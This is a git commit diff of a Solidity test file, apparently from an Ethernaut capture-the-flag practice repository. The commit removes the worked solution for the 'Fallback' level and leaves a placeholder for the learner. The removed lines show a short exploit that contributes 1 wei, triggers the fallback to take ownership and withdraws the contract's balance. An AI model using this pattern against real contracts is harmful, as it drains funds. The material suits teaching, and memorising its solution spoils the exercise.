949a0a73e8624dc33a0e2c3a77786eae63d64d3e
alex0207s <alex640702070829@gmail.com>
2023-05-06 19:23:25 +0800

    :recycle: Remove the challenge 1 Fallback PoC code from template test file and refactor it

--- test/01-Fallback.t.sol
+++ test/01-Fallback.t.sol
@@ -3,17 +3,19 @@ pragma solidity ^0.8.10;
 import "ds-test/test.sol";
 import "forge-std/Vm.sol";
 
-import "src/levels/01-Fallback/FallbackFactory.sol";
 import "src/core/Ethernaut.sol";
+import "src/levels/01-Fallback/FallbackFactory.sol";
 
 contract FallbackTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    address eoaAddress = address(100);
+    address hacker = vm.addr(1); // generate random-looking address with given private key
 
     function setUp() public {
         ethernaut = new Ethernaut();
-        vm.deal(eoaAddress, 5 ether);
+
+        // set hacker's balance to 1 Ether, use it when you need!
+        // vm.deal(hacker, 1 ether); 
     }
 
     function testFallbackHack() public {
@@ -22,26 +24,14 @@ contract FallbackTest is DSTest {
         /////////////////
         FallbackFactory fallbackFactory = new FallbackFactory();
         ethernaut.registerLevel(fallbackFactory);
-        vm.startPrank(eoaAddress);
+        vm.startPrank(hacker);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback ethernautFallback = Fallback(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-        // Contribute 1 wei - verify contract state has been updated
-        ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
-
-        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
-        payable(address(ethernautFallback)).call{value: 1 wei}("");
-        // Verify contract owner has been updated to 0 address
-        assertEq(ethernautFallback.owner(), eoaAddress);
-
-        // Withdraw from contract - Check contract balance before and after
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-        ethernautFallback.withdraw();
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
+        // implement your solution here 
 
         //////////////////////
         // LEVEL SUBMISSION //
